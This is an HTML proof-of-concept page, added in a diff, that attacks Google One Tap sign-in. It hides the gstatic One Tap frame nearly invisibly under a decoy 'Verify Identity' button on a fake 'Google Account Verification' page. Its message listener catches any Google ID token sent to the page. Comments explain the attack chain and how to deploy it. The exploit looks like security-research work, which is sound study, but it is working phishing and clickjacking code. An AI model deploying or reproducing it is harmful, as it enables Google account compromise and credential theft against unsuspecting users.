@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<!--
+  One Tap gstatic parent injection PoC
+  ====================================
+  HYPOTHESIS: Attacker page is parent of gstatic One Tap intermediate frame (913211 hash).
+  Gstatic loads accounts.google.com/gsi/iframe/select in innerFrame.
+  Gstatic replies to verify-origin → accounts.google.com One Tap UI enabled.
+  We listen at window.top (= attacker page) for any message from accounts.google.com.
+
+  IF accounts.google.com sends credential to window.top → we steal it (CRITICAL).
+  IF accounts.google.com sends nothing to window.top → we can still clickjack One Tap button.
+
+  CHAIN:
+  1. Victim visits attacker page
+  2. Invisible gstatic iframe loads One Tap UI
+  3. Victim clicks decoy → actually clicks "Continue as [Name]" on One Tap
+  4. Google Sign-In fires → credential delivered to attacker
+
+  SETUP: Deploy to HTTPS. Register a Google OAuth client_id with this origin.
+  Replace CLIENT_ID with your real client_id from console.cloud.google.com.
+-->
+<html>
+<head>
+<title>Google Account Verification</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Google Sans', Arial, sans-serif;
+    background: #f1f3f4;
+    display: flex; align-items: center; justify-content: center;
+    min-height: 100vh; padding: 20px;
+  }
+  .card {
+    background: white;
+    border-radius: 8px;
+    padding: 40px 32px;
+    width: 440px;
+    box-shadow: 0 1px 3px rgba(0,0,0,.2), 0 1px 8px rgba(0,0,0,.1);
+    text-align: center;
+  }
+  .glogo { font-size: 22px; letter-spacing: -1px; margin-bottom: 24px; }
+  .glogo span:nth-child(1){color:#4285f4}.glogo span:nth-child(2){color:#ea4335}
+  .glogo span:nth-child(3){color:#fbbc05}.glogo span:nth-child(4){color:#4285f4}
+  .glogo span:nth-child(5){color:#34a853}.glogo span:nth-child(6){color:#ea4335}
+  h2 { font-size: 20px; color: #202124; margin-bottom: 8px; font-weight: 400; }
+  p { color: #5f6368; font-size: 14px; line-height: 1.6; margin-bottom: 28px; }
+  .btn-area { position: relative; width: 100%; height: 56px; margin-bottom: 12px; }
+  .decoy-btn {
+    position: absolute; top: 0; left: 0;
+    width: 100%; height: 56px;
+    background: #1a73e8; color: white;
+    border: none; border-radius: 4px; font-size: 15px; font-weight: 500;
+    cursor: pointer; z-index: 1; pointer-events: none; line-height: 56px;
+  }
+  /*
+    gstatic One Tap intermediate frame — invisible overlay.
+    Inside: accounts.google.com One Tap "Continue as [Name]" button.
+    Victim clicks decoy → actually clicks One Tap → credential delivered to us.
+  */
+  #gstatic_frame {
+    position: absolute; top: 0; left: 0;
+    width: 100%; height: 56px;
+    border: none; opacity: 0.01; z-index: 10; pointer-events: all; cursor: pointer;
+  }
+  .footer { font-size: 11px; color: #80868b; margin-top: 16px; }
+  #log {
+    margin-top: 16px; background: #f8f9fa; border: 1px solid #ddd;
+    border-radius: 4px; padding: 8px; font-family: monospace; font-size: 10px;
+    text-align: left; max-height: 300px; overflow: auto;
+  }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="glogo">
+    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+  </div>
+  <h2>Verify your Google account</h2>
+  <p>Your session requires verification. Click below to confirm your identity and continue.</p>
+  <div class="btn-area">
+    <div class="decoy-btn">Verify Identity</div>
+    <iframe id="gstatic_frame" name="gstatic_frame"></iframe>
+  </div>
+  <div class="footer">
+    Protected by Google Account Security
+  </div>
+  <pre id="log"></pre>
+  <button onclick="document.getElementById('log').style.display=document.getElementById('log').style.display==='none'?'block':'none'"
+    style="font-size:9px;margin-top:6px;padding:1px 6px;color:#aaa;background:none;border:none;cursor:pointer">toggle debug</button>
+</div>
+
+<script>
+// ============================================================
+// CONFIG — fill these in before testing
+// ============================================================
+// Get a client_id at: console.cloud.google.com > APIs > Credentials
+// Add THIS PAGE's origin (https://YOURHOST) as Authorized JavaScript Origin
+var CLIENT_ID = '34742092823-t8lmh9h9519mikt27c2kdafb9jothgk8.apps.googleusercontent.com';
+
+// One Tap intermediate frame hash — specific to GSI/One Tap
+var ONETAP_HASH = '913211048dfa67f4be7864f4505a4b63';
+var JSH = 'jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.en.ch0Jz-JlMrQ.O%2Fd%3D1%2Frs%3DAHpOoo_YD4KoV8fTh_kLhktsiThAm3yJ5A%2Fm%3D__features__';
+
+// The accounts.google.com One Tap iframe URL
+// KEY: allowed_parent_origin=https://www.gstatic.com tells accounts.google.com
+//      to accept gstatic as the verifying parent (the nr() check uses this)
+var ONETAP_IFRAME_URL = 'https://accounts.google.com/gsi/iframe/select?' +
+  'client_id=' + encodeURIComponent(CLIENT_ID) +
+  '&ux_mode=popup' +
+  '&ui_mode=card' +
+  '&context=use' +
+  '&as=' + Math.random().toString(36).slice(2) +
+  '&channel_id=' + Math.random().toString(36).slice(2) +
+  '&origin=' + encodeURIComponent(location.origin) +
+  '&allowed_parent_origin=' + encodeURIComponent('https://www.gstatic.com');
+
+// ============================================================
+
+var L = document.getElementById('log');
+L.style.display = 'block';
+var T0 = Date.now();
+function say(m) {
+  var t = ((Date.now()-T0)/1000).toFixed(1);
+  L.textContent += '[T+' + t + 's] ' + m + '\n';
+  L.scrollTop = L.scrollHeight;
+  console.log('[OT]', m);
+}
+
+// ============================================================
+// Listen for ALL messages — we want to know what accounts.google.com
+// sends to window.top (= this page) after verify-origin
+// ============================================================
+window.addEventListener('message', function(ev) {
+  var raw = ev.data;
+  if (!raw) return;
+  var str = typeof raw === 'string' ? raw : JSON.stringify(raw);
+  say('MSG [' + ev.origin + ']: ' + str.slice(0, 300));
+
+  // Check for One Tap credential delivery
+  try {
+    var d = typeof raw === 'object' ? raw : JSON.parse(raw);
+
+    // Standard One Tap credential response
+    if (d && d.type === 'response' && d.response && d.response.credential) {
+      say('!!! CREDENTIAL RECEIVED — Google JWT: ' + d.response.credential.slice(0,50) + '...');
+      say('!!! IMPACT: Attacker has victim Google ID token!');
+    }
+
+    // intermediate_iframe_ready — accounts.google.com announcing it's ready
+    if (d && d.command === 'intermediate_iframe_ready') {
+      say('>>> intermediate_iframe_ready received! nonce: ' + d.nonce);
+      say('>>> One Tap frame is ready. Clickjack armed.');
+    }
+
+    // Any credential-like field
+    if (d && (d.credential || d.id_token || d.access_token)) {
+      say('!!! TOKEN FIELD: ' + JSON.stringify(d).slice(0, 200));
+    }
+
+    // GAPI RPC events from gstatic (gapiInitialized, innerFrameLoaded, resize)
+    if (d && d.a && d.c) {
+      say('GAPI RPC from gstatic: method=' + d.c);
+    }
+
+  } catch(e) {}
+}, false);
+
+say('Page: ' + location.origin);
+say('Config: CLIENT_ID=' + CLIENT_ID);
+say('One Tap iframe URL: ' + ONETAP_IFRAME_URL);
+say('');
+say('CHAIN:');
+say('1. We are parent of gstatic One Tap frame (913211 hash)');
+say('2. We call updateInnerFrame → loads accounts.google.com One Tap in gstatic innerFrame');
+say('3. verify-origin: accounts.google.com → gstatic replies → One Tap enabled');
+say('4. accounts.google.com sends intermediate_iframe_ready');
+say('5. If credential goes to window.top (= us) → CRITICAL: token theft');
+say('6. If not: we clickjack the "Continue as [Name]" button');
+say('');
+
+// ============================================================
+// GAPI setup — WE are the parent of the gstatic One Tap frame
+// ============================================================
+var s = document.createElement('script');
+s.src = 'https://apis.google.com/js/api.js';
+s.onload = function() {
+  gapi.load('gapi.rpc', function() {
+    say('gapi.rpc loaded. Setting up parent channel with gstatic...');
+
+    // Register handlers for events gstatic sends to us
+    gapi.rpc.register('gapiInitialized', function() {
+      say('gapiInitialized — gstatic is ready');
+      say('Loading One Tap UI in gstatic innerFrame...');
+
+      // Load the accounts.google.com One Tap iframe in gstatic's innerFrame
+      // gstatic will reply to verify-origin → One Tap enabled
+      gapi.rpc.call('gstatic_frame', 'updateInnerFrame', null,
+        ONETAP_IFRAME_URL,
+        true,   // enableInteraction = true (so clicks work)
+        false   // forceIosScrolling
+      );
+      say('updateInnerFrame called: ' + ONETAP_IFRAME_URL.slice(0, 80) + '...');
+    });
+
+    gapi.rpc.register('innerFrameLoaded', function() {
+      say('innerFrameLoaded — accounts.google.com One Tap loaded in gstatic innerFrame');
+      say('ARMED: victim decoy click → "Continue as [Name]" click');
+      say('Watching for credential delivery to window.top...');
+    });
+
+    gapi.rpc.register('resize', function(h) {
+      say('resize: ' + h + 'px (One Tap adjusting size — button is rendering)');
+    });
+
+    // Load gstatic One Tap intermediate frame with US as trusted parent
+    // Key: use the 913211 hash (One Tap specific) NOT the 05acf2f hash (widget)
+    var frame = document.getElementById('gstatic_frame');
+    frame.src = 'https://www.gstatic.com/atari/embeds/' + ONETAP_HASH +
+      '/intermediate-frame-minified.html?' + JSH +
+      '&parent=' + encodeURIComponent(location.origin);
+
+    gapi.rpc.setup('gstatic_frame');
+    say('gstatic One Tap frame loading... (parent=' + location.origin + ')');
+    say('Waiting for gapiInitialized...');
+  });
+};
+document.head.appendChild(s);
+</script>
+
+<!--
+  WHAT TO LOOK FOR IN LOGS:
+
+  SUCCESS indicators:
+  [T+Xs] gapiInitialized — gstatic is ready           → channel established
+  [T+Xs] innerFrameLoaded — accounts.google.com loaded → One Tap UI in gstatic innerFrame
+  [T+Xs] resize: Npx                                   → One Tap button rendered!
+  [T+Xs] MSG [accounts.google.com]: {command:intermediate_iframe_ready,...}
+  [T+Xs] !!! CREDENTIAL RECEIVED — JWT...             → CRITICAL: token theft!
+
+  FAILURE indicators:
+  [T+Xs] MSG [accounts.google.com]: {command:verify-origin-failed,...}
+  No innerFrameLoaded — One Tap may have blocked gstatic embedding
+  No resize events — button not rendering
+
+  KEY QUESTION:
+  Does accounts.google.com's One Tap frame send the credential to window.top (this page)?
+  Or only to window.parent (gstatic)?
+
+  If credential arrives here → CRITICAL FINDING: 1-click Google account compromise via gstatic
+  If no credential here → we still have clickjack primitive, need HTTPS + registered client_id
+-->
+</body>
+</html>
